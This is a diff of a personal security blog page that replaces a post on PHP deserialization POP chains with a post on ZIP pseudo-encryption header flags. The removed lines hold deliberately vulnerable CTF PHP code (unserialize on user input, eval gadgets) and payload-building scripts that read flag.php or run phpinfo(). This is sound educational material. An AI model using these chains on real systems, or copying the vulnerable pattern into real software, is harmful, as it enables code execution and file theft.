@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php反序列化（phar://）, Hbluewhite的Blog">
+    <meta name="keywords" content="ZIP伪加密, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php反序列化（phar://） | Hbluewhite的Blog</title>
+    <title>ZIP伪加密 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php反序列化（phar://）</h1>
+                    <h1 class="description center-align post-title">ZIP伪加密</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php/">
-                                <span class="chip bg-color">php</span>
+                            <a href="/tags/Misc/">
+                                <span class="chip bg-color">Misc</span>
                             </a>
                         
                     </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-14
+                    2021-10-28
                 </div>
                 
 
@@ -514,45 +514,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="php序列化和反序列化"><a href="#php序列化和反序列化" class="headerlink" title="php序列化和反序列化"></a>php序列化和反序列化</h1><h2 id="pop链和phar-协议"><a href="#pop链和phar-协议" class="headerlink" title="pop链和phar://协议"></a>pop链和phar://协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面是一个flag.php的源码</p>
-<ol>
-<li>首先看到unserialize($_GET[‘hello’])将get传参的hello进行了反序列化操作。那么将会调用到Show类中__wakeup方法。（在反序列化时进行调用）</li>
-<li>因为this -&gt; source = “index.php” source被当作字符串所以调用Show类中的_to string.</li>
-<li><code>return $this-&gt;str[&#39;str&#39;]-&gt;source</code>source属性不存在所以调用Test类中的get方法。</li>
-<li><code>$function = $this-&gt;p; return $function;</code>把取出来的p当作还是调用因此优惠引起调用了Read类中_invoke方法，其中还就可以把文件读取出来了。</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Show&#123;</span><br><span class="line">	public $source;</span><br><span class="line">	public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">	public $p;</span><br><span class="line">&#125;</span><br><span class="line">class Read&#123;</span><br><span class="line">	publc $var = &quot;flag.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$r = new Read();</span><br><span class="line">$t -&gt; p = $r;</span><br><span class="line">$s -&gt;str[&quot;str&quot;] = $t;</span><br><span class="line">$s -&gt; source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure>
-
-<p>还有一个简单的例子</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        //$obj = new test1; 这里可以控制$obj为任意对象</span><br><span class="line">        $this-&gt;obj-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test1&#123;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        echo &quot;123&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用的pop链。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">class OowoO&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;obj = new test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new OowoO()));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<p><img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200601123243831-993781483.png" alt="img"></p>
-<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session主要就是一个存取对话信息或者通话的变量，一般session的值session.save_handler来进行存储的。</p>
-<p>关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置</p>
-<ol>
-<li>session.serialize_handler = php序列化的结果</li>
-</ol>
-<p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153453970-831696609.png" alt="img"></p>
-<p>它的规则是$_SESSION是个数组，数组中的键和值中间用 | 来分割，值如果是数组或对象按照序列化的格式存储</p>
-<p>session.serialize_handler = php_serialize的序列化结果</p>
-<p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153731026-2081840128.png" alt="img"></p>
-<p>它是全程按照serialize的格式序列化了$_SESSION这个数组</p>
-<p>它比php的格式多了个最前面多了个 “a:2:{ ….” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对</p>
-<h3 id="储存溢出"><a href="#储存溢出" class="headerlink" title="储存溢出"></a>储存溢出</h3><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项 session.save_handler 来 进行确定的，默认是以文件的方式储存。储存的文件是以 sess_PHPSESSID 来进行命名的，文件的内容 就是session值得序列化之后得内容。</p>
-<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>序列化对象中字符串的长度，只能反序列化相应长度的字，不能进行闭合。</p>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;???</span><br><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据反序列化我们可以看到上面之后的反序列话是一样的，所以在做相应的题目时，我们可以通过字符串溢出来进行编码</p>
-<p>一般会有一个函数或者方法将字符串改变</p>
-<p>例如：</p>
-<p>将flag换成index，长度就加一上面的遇到这类型，我们都可以用字符串溢出的方式来进行反序列化获取参数。</p>
+                <h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>zip伪造加密，首先我们要先知道，压缩包的各个部分</p>
+<p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密） 头文件标记后2bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 00 00：扩展记录长度<br> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br><strong>压缩源文件目录区：</strong> </p>
+<p>50 4B 01 02：目录中文件文件头标记(0x02014b50) </p>
+<p>3F 00：压缩使用的 pkware 版本</p>
+<p>14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性 </p>
+<p>00 00 00 00：局部头部偏移量</p>
+<p>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br><strong>压缩源文件目录结束标志：</strong><br> 50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 59 00 00 00：目录区尺寸大小 </p>
+<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
+<p>00 00：ZIP 文件注释长度</p>
+<p> 这个详细的介绍了各部分的含义，修改其压缩源文件目录区的全布局方式标记比特值之后即可对文件加密或解密。</p>
+<h2 id="真加密与伪加密"><a href="#真加密与伪加密" class="headerlink" title="真加密与伪加密"></a>真加密与伪加密</h2><p>其实上面也说了真加密和伪加密容易出现的位置，首先压缩文件数字区中全局变量中00是否为90，这里是判断加密的条件之一，但是当压缩文件数字区为90时，压缩文件目录区应该也为90</p>
+<p>题目中很容易出现，压缩文字目录区为90，而压缩文字数字区为00，这种情况也就是伪加密，所以当我们遇到这种情况要按照相应的位置进行修改。</p>
+<h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> （504B0304两个bytes之后）<br> 且压缩源文件目录区的全局方式位标记应当为<code>00 00</code>（504B0304四个bytes之后）</p>
+<h3 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p>
+<h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code> </p>
 
                 
             </div>
@@ -579,7 +555,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/">http://example.com/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/</a>
+                    <a href="http://example.com/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">http://example.com/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -617,8 +593,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/php/">
-                                    <span class="chip bg-color">php</span>
+                                <a href="/tags/Misc/">
+                                    <span class="chip bg-color">Misc</span>
                                 </a>
                             
                         </div>
@@ -1056,9 +1032,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">
                     <div class="card-image">
@@ -1076,9 +1053,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1087,6 +1064,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1105,13 +1083,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                <a href="/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.png" class="responsive-img" alt="php序列化和反序列化">
+                        <img src="/medias/featureimages/22.png" class="responsive-img" alt="php反序列化（phar://）">
                         
-                        <span class="card-title">php序列化和反序列化</span>
+                        <span class="card-title">php反序列化（phar://）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1122,7 +1100,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-14
                             </span>
                         <span class="publish-author">
                             
